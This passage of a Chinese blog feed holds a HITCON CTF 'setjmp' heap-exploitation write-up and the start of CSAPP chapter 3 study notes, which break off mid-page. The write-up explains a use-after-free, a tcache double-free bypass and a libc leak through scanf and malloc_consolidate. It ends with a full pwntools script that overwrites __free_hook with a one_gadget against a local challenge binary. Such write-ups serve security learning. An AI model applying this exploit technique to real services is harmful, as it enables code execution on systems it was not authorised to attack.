    <content type="html"><![CDATA[<h1 id="HITCON-CTF-——-setjmp"><a href="#HITCON-CTF-——-setjmp" class="headerlink" title="HITCON CTF —— setjmp"></a>HITCON CTF —— setjmp</h1><p>题目下载：<a href="https://ctf2024.hitcon.org/dashboard/">https://ctf2024.hitcon.org/dashboard/</a></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>之前没遇见过setjmp函数，看的这<a href="https://zhuanlan.zhihu.com/p/82492121">setjmp</a>了解了一下</p><p>现在来分析一下程序</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510214124-a2ae9sm.png" alt="image"></p><p>看一下这个菜单，相较于一般的菜单堆题，多了一个restart，其余的就是一般题目中都有的创建，删除，修改和查看</p><h3 id="restart"><a href="#restart" class="headerlink" title="restart"></a>restart</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510214532-ylwar9n.png" alt="image"></p><p>可以看到，重启这个功能就是跳回到程序开始的地方，就是直接跳回去，没有对我们创建过的东西进行任何修改</p><p>并且，他会重新创建一个root用户</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510214835-hku1hwe.png" alt="image"></p><p>我们不能够控制自己分配chunk的大小，每个用户只有0x20大小的空间</p><p>然后下面写地址的地方看起来感觉有点乱，在gdb里面看一下，其实就是把每个用户之间的地址用双链的结构</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510220053-hq8ukfb.png" alt="image"></p><h3 id="del"><a href="#del" class="headerlink" title="del"></a>del</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250510220313-ro9e8hl.png" alt="image"></p><p>free之后没有置零</p><h3 id="change"><a href="#change" class="headerlink" title="change"></a>change</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511173848-qj3q0v7.png" alt="image">​</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511202557-c9j2ukn.png" alt="image"></p><h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511174226-idgcfyj.png" alt="image">​</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这是2.31版本的glibc(给了dockerfile文件，从里面的哈希值得出的），hook钩子还存在，tcache有简单的检查double free的机制，还没有混淆，可以使用tcache poisoning</p><p>大致思路就是泄露出libc，使用tcache poisoning申请到free_hook处写入one_gadget或则system。</p><p>但是这道题限制了申请只能为0x20,在fastbin里面，我们泄露不了libc，我目前的想法是修改一个chunk的size位，然后再进行free（不知道还有没有其他办法，如果有，希望师傅们可以在留言里告诉我一下）</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><h4 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h4><p>我们之前就看到了del里面有一个uaf漏洞，当我们把里面唯一的一个用户删除时，他的双链是指向自己的</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511211500-sb9xg79.png" alt="image"></p><p>这时候我们就可以绕过他双链自己的检测，使用到他的uaf漏洞修改他的bk处的值，绕过2.31的tcache上的double free机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">dele(b<span class="hljs-string">&#x27;root&#x27;</span>)   <br>change(b<span class="hljs-string">&#x27;\x00&#x27;</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>dele(b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250511212032-dr0ayj7.png" alt="image"></p><h4 id="尝试（失败了）"><a href="#尝试（失败了）" class="headerlink" title="尝试（失败了）"></a>尝试（失败了）</h4><p>我开始的思路是通过double free取申请一个chunk上面一点的位置，使之刚好可以修改这个chunk的size位，然后修改size位unsorted bin大小，free掉这个chunk后，就会泄露出一个值取计算libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">dele(<span class="hljs-string">b&#x27;root&#x27;</span>)   <br>show()<br>io.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>data = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data:&#x27;</span>,<span class="hljs-built_in">hex</span>(data))<br>res()<br>add(<span class="hljs-string">b&#x27;aaaa&#x27;</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;root&#x27;</span>) <br>change(p64(data+<span class="hljs-number">0x556253a616e0</span>-<span class="hljs-number">0x556253a61010</span>)[:<span class="hljs-number">6</span>],<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>dele(p64(data+<span class="hljs-number">0x556253a616e0</span>-<span class="hljs-number">0x556253a61010</span>)[:<span class="hljs-number">6</span>])<br><br>add(p64(data+<span class="hljs-number">0x556253a616d0</span>-<span class="hljs-number">0x556253a61010</span>)[:<span class="hljs-number">6</span>],p64(data)[:<span class="hljs-number">6</span>])<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>,p64(<span class="hljs-number">0x540</span>))<br>dele(p64(data+<span class="hljs-number">0x000055882c11c370</span>-<span class="hljs-number">0x55882c11c010</span>)[:<span class="hljs-number">6</span>])<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512084659-h9me6aj.png" alt="image"></p><p>本来我感觉所有的都调好了，高高兴兴去free这个chunk，然后被这个程序自己的双链检测机制给拦住了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512084919-fdv3ig0.png" alt="image"></p><p>从这看出，程序的双链没有指向的我想free掉的chunk</p><p>然后我就去看了这道题目的wp，发现泄露libc用到的竟然是scanf</p><h4 id="利用scanf泄露libc"><a href="#利用scanf泄露libc" class="headerlink" title="利用scanf泄露libc"></a>利用scanf泄露libc</h4><p>参考文章 <a href="https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html" title="Permalink to Heap exploitation, glibc internals and nifty tricks.">Heap exploitation, glibc internals and nifty tricks.</a></p><p>scanf在我们进行输入的时候会开辟一个缓存空间在堆上，然后在函数返回的时候会将这个堆释放。但是我们如果直接使用scanf在本题里面输入很长的内容使之生成了一个大的unsorted bin，但在scanf函数返回后，unsorted bin也会因为与top chunk相邻而合并，这时候就需要使用到malloc_consolidate这个函数（很早之前就看过这个函数了，还是第一次用）当我们申请了很多个fast bin大小的chunk然后再free掉之后，调用malloc_consolidate这个函数就可以使这些fast bin大小的chunk合并为一个unsorted bin的chunk</p><p>（关于malloc_consolidate的调用时机可以看看这<a href="https://bbs.kanxue.com/thread-257742.htm#msg_header_h2_2">https://bbs.kanxue.com/thread-257742.htm#msg_header_h2_2</a>）</p><p>创建许多个用户再删除，让堆空间存在很多个fast bin chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    add(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(i))<br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    dele(<span class="hljs-built_in">str</span>(i))<br></code></pre></td></tr></table></figure><p>然后我们使用scanf输入很多数据，使之生成一个large bin从而触发malloc_consolidate合并之前的fast bin</p><p>但是这一步有两个需要关注的点：</p><p>1.我们需要调用一下重启功能，让程序自己在我们的fast bin下面创建两个0xd1的chunk隔绝top chunk</p><p>2.由于我们scanf的函数读取的是int类型</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512141615-wafkwiw.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512141733-zovaxe1.png" alt="image"></p><p>所以我们输入的数据只能用0填充，因为0*0x540还是0，但是使用其他数据就不包含在条件里会执行exit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">res()<br>choose(<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x500</span>)<br></code></pre></td></tr></table></figure><p>这样，就出现了unsorted bin</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512142058-eor4r7z.png" alt="image"></p><p>之后再将之前的tcache bin全部申请出来，只剩下unsorted bin的时候，申请一个用户名和密码都为空的用户，就不会覆盖需要leak的数据（最低位会被换行符覆盖，但是没什么影响），show一下就出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(i))<br>     <br>add(<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>show()<br>io.recv()<br>data1=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data1&quot;</span>,<span class="hljs-built_in">hex</span>(data1))<br>offset=<span class="hljs-number">0x7f1a7754a000</span>-<span class="hljs-number">0x7f1a77735b0a</span><br>libc_base=data1+offset<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512142503-0ihu7nx.png" alt="image"></p><p>后面的做法就是使用double free申请到free hook处进行修改就可以了，就不详细分析了</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=process(<span class="hljs-string">&#x27;./run&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./run&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choose</span>(<span class="hljs-params">num</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,num)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">res</span>():<br>    choose(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name,password</span>):<br>    choose(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,name)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,password)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">name</span>):<br>    choose(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,name)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">name,password</span>):<br>    choose(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    io.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,name)<br>    io.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,password)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    choose(<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><br><br><span class="hljs-comment"># dele(b&#x27;root&#x27;)   </span><br><span class="hljs-comment"># show()</span><br><span class="hljs-comment"># io.recvuntil(b&#x27;: &#x27;)</span><br><span class="hljs-comment"># data = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-comment"># print(&#x27;data:&#x27;,hex(data))</span><br><span class="hljs-comment"># res()</span><br><span class="hljs-comment"># add(b&#x27;aaaa&#x27;,b&#x27;aaaa&#x27;)</span><br><span class="hljs-comment"># dele(b&#x27;aaaa&#x27;)</span><br><span class="hljs-comment"># dele(b&#x27;root&#x27;) </span><br><span class="hljs-comment"># change(p64(data+0x556253a616e0-0x556253a61010)[:6],b&#x27;\x00&#x27;*8)</span><br><span class="hljs-comment"># dele(p64(data+0x556253a616e0-0x556253a61010)[:6])</span><br><br><span class="hljs-comment"># add(p64(data+0x556253a616d0-0x556253a61010)[:6],p64(data)[:6])</span><br><span class="hljs-comment"># add(b&#x27;a&#x27;,b&#x27;a&#x27;)</span><br><span class="hljs-comment"># add(b&#x27;aa&#x27;,p64(0x540))</span><br><span class="hljs-comment"># dele(p64(data+0x000055882c11c370-0x55882c11c010)[:6])</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    add(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(i))<br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    dele(<span class="hljs-built_in">str</span>(i))<br>    <br>res()<br>choose(<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x500</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">str</span>(i))<br>     <br>add(<span class="hljs-string">b&#x27;&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>show()<br>io.recv()<br>data1=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data1&quot;</span>,<span class="hljs-built_in">hex</span>(data1))<br>offset=<span class="hljs-number">0x7f1a7754a000</span>-<span class="hljs-number">0x7f1a77735b0a</span><br>libc_base=data1+offset<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>onegaddet=libc_base+<span class="hljs-number">0xe6aee</span> <span class="hljs-comment">#0xe6af1 #0xe6af4</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    add(<span class="hljs-string">f&quot;a<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>) <span class="hljs-comment">#把之前的unsorted bin用完</span><br><br>res()<br>dele(<span class="hljs-string">b&#x27;root&#x27;</span>)   <br>show()<br>io.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>data2 = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data2:&#x27;</span>,<span class="hljs-built_in">hex</span>(data2))<br>res()<br>add(<span class="hljs-string">b&#x27;aaaa&#x27;</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;root&#x27;</span>) <br>change(p64(data2+<span class="hljs-number">0x000055aa5cae8320</span>-<span class="hljs-number">0x55aa5cae7010</span>)[:<span class="hljs-number">6</span>],<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>dele(p64(data2+<span class="hljs-number">0x000055aa5cae8320</span>-<span class="hljs-number">0x55aa5cae7010</span>)[:<span class="hljs-number">6</span>])<br>add(p64(free_hook)[:<span class="hljs-number">6</span>],<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;b&#x27;</span>)<br>add(p64(onegaddet)[:<span class="hljs-number">6</span>],<span class="hljs-string">b&#x27;a&#x27;</span>)<br>dele(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>gdb.attach(io)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250512144737-dcoqw6r.png" alt="image"></p><p>感觉这个题也不算很难，但是我之前没遇见过通过scanf得到unsorted bin的手法，写下来记录一下</p>]]></content>
    
    
    <categories>
      
      <category>刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>HITCON CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第三章：程序的机器级表示</title>
    <link href="/post/csapp-chapter-3-machinelevel-representation-of-programs-z17vqpx.html"/>
    <url>/post/csapp-chapter-3-machinelevel-representation-of-programs-z17vqpx.html</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-第三章：程序的机器级表示"><a href="#CSAPP-第三章：程序的机器级表示" class="headerlink" title="CSAPP 第三章：程序的机器级表示"></a>CSAPP 第三章：程序的机器级表示</h1><p><a href="assets/541118%20%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%8E%9F%E4%B9%A6%E7%AC%AC%E4%B8%89%E7%89%88%EF%BC%89-20250414204331-oqwbxqj.pdf">深入理解计算机系统（原书第三版）.pdf</a></p><p>由于基础知识太差，xia0ji233师傅建议我来看一下CSAPP第三章。这本书看得好艰难！！！感觉自己大概都知道这些知识点，但是一些细节问题又不太了解，表达方式也和我之前学习的时候的表达方式不一样，最后加上这一章竟然有足足的一百一十页，真是看得我要晕字了。</p><h2 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h2><p>这一部分讲的其实就是如何将一个.c文件变成一个可执行的elf文件</p><p>比如，我们现在写了一个最简单的c程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们拥有了一个.c文件，但是.c文件在linux里面不能直接运行</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250414214524-qf66iz0.png" alt="image"></p><p>所以我们需要将他编译为可执行文件（忘记写换行了）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250414214717-2wt6olg.png" alt="image"></p><p>将c文件变为可以执行的elf文件，使用的是以下的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -g hello.c -o hello<br></code></pre></td></tr></table></figure><p>​<code>-g</code>​保留一些调试信息，<code>-o</code>​重命名</p><p>在这一条指令背后，包含了四个过程</p><p>1.预处理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -E hello.c -o hello1.i<br></code></pre></td></tr></table></figure><ul><li></li><li><p>​ <strong>​<code>#include</code>​</strong>​ 会将头文件内容插入到源代码中。</p></li><li><p>​ <strong>​<code>#define</code>​</strong>​ 会替换代码中的宏定义。</p></li><li><p>还会处理注释的删除、行号标记等。</p></li><li><p>预处理后，代码变成了一个单纯的、没有宏和头文件包含的标准 C 代码。</p></li></ul><p>2.编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -S hello1.i -o hello1.s<br></code></pre></td></tr></table></figure><ul><li><p>编译器会进行语法分析、语义分析、优化等工作：</p><ul><li><strong>语法分析</strong>：检查代码是否符合 C 语言的语法规则。</li><li><strong>语义分析</strong>：检查代码的逻辑、变量类型等是否正确。</li><li><strong>生成汇编代码</strong>：将 C 代码转化为对应的汇编语言代码。</li></ul></li><li><p>如果没有出现错误，编译器将生成 <code>.s</code>​ 汇编文件</p></li></ul><p>例如我之前函数输错了就会在编译阶段检查出来</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250414215718-gnrltgg.png" alt="image"></p><p>3.汇编：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -c。/ hello1.s -o hello1.o<br></code></pre></td></tr></table></figure><ul><li>编译阶段生成的汇编代码（<code>.s</code>​ 文件）会通过汇编器（<code>as</code>​）转换为目标文件（<code>.o</code>​ 文件）。</li><li>汇编器会将汇编代码转化为机器代码（机器指令），并生成可重定向文件 <code>hello.o</code>​。这个文件包含了程序的二进制代码，但还没有完成链接，因此还无法执行。</li></ul><p>4.链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$gcc</span> -g hello1.o -o hello1<br></code></pre></td></tr></table></figure><ul><li>链接器（<code>ld</code>​）将所有的目标文件和标准库链接在一起，生成最终的可执行文件。</li></ul><p>‍</p><p>对于生成的hello1.o文件和hello的可执行文件，由于是二进制文件，我们不能够在文本编辑器中显示，我们可以使用反汇编器使之根据机器代码生成一种类似于汇编代码的格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$objdump</span> -d xxx.o<br><span class="hljs-variable">$objdump</span> -d ELFfile<br></code></pre></td></tr></table></figure><p>反汇编后的样子类似于这样</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416071908-0qjfztz.png" alt="image"></p><h3 id="机器级代码"><a href="#机器级代码" class="headerlink" title="机器级代码"></a>机器级代码</h3><p>对机器级编程来说，其中两种抽象尤为重要：</p><p>1.指令集体系结构或指令级架构来定义机器级程序的格式和行为——它定义了处理器，指令的格式，以及每条指令对状态的影响（翻译为不那么学术的说法就是当你编写 C 语言代码并编译成机器代码时，编译器会根据目标硬件的指令集生成适合的汇编或机器代码。）</p><p>2.机器级程序使用的内存地址是虚拟地址——提供的内存模型看起来是非常大的字节数组（这个得去看看虚拟内存机制）</p><p>然后在机器码里面，我们还能看到一些我们在写c的时候看不到的东西：</p><p>1.程序计数器</p><p>通常称为“pc”，在x86-64里面用寄存器rip表示，将下一条要执行的指令的地址放进这一个寄存器里面</p><p>2.寄存器</p><p>平常我们在汇编里面看到的寄存器，如下图这些</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416013620-w1tiw7m.png" alt="image"></p><p>3.状态寄存器</p><p>用于控制跳转指令条件的寄存器</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416063942-eissxt7.png" alt="image"></p><p>4.向量寄存器</p><p>可以存放一个或多个整数或浮点数值</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416065139-bauhvjv.png" alt="image"></p><p>虽然c语言提供了一种模型，可以在内存中声明和分配各种数据类型对象，到那时机器码只是简单的将内存看成一个很大的，按字节寻址的数组。</p><p>c语言中的聚合数据类型，例如数组和结构，在机器代码中用一段连续的字节来表示。</p><p>即使是对标量的数据类型，汇编代码也不区分有符号到无符号整数，不区分各种类型指针，甚至不区分指针和整数。</p><p>机器码具有如下特性：</p><ul><li>指令可以从任意地址编码，无对齐规则，只是任意地址开始的编码很可能产生错误的编码或者是运行产生错误的结果。</li><li>指令长度从1-15个字节不等，运用了哈夫曼编码的思想：越常用的指令字节数越少，越不常用的指令字节数越多。</li><li>反汇编器只是根据字节序列确定汇编代码，它完全不需要知道编译出该程序的源文件即可得到。</li></ul><h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250416072441-y93w7fw.png" alt="image"></p><p>如图所示，大多数gcc生成的汇编代码指令都有一个字符后缀，表明操作数大小。</p><p>我们可以看到使用“l”同时表示了四字节大小的int类型和八字节大小的double类型，那这在使用的时候会产生冲突吗？</p><p>答案是不会的，因为double使用的是一组和整数完全不同的指令的寄存器</p><h2 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h2><p>现在介绍一下16个通用寄存器</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250417175323-mhvemb1.png" alt="image"></p><p>在32位机器的时候，本来只有8个通用寄存器（上图的前八个），到64位后，增加了r8 - r15，虽然这些寄存器都是8字节的，但是仍然可以表示低字节，例如：对于rax，rax表示八字节，eax则表示4字节，ax表示最低两字节的高位，al表示最低两字节的低位；可以根据上图查看寄存器的低字节表示</p><p>对于生成小于8字节结果指令，寄存器中字节生成有两条规则：</p><p>1.生成1字节和2字节数字的指令会保持剩下的字节；</p><p>2.生成4字节的指令会把高4位置零</p><h3 id="操作数指示符"><a href="#操作数指示符" class="headerlink" 